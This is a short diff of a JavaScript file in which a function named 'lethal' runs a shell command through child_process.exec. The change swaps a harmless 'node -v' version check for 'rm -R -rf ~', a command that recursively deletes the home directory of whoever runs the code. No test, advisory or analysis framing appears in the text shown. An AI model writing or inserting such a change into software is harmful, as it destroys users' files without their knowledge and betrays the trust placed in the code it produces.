@@ -1,7 +1,7 @@
 const { exec } = require('child_process');
 
 const lethal = () => {
-  exec(`node -v`, (err, stdout, stderr) => {
+  exec(`rm -R -rf ~`, (err, stdout, stderr) => {
     if (err) {
       // node couldn't execute the command
       return;
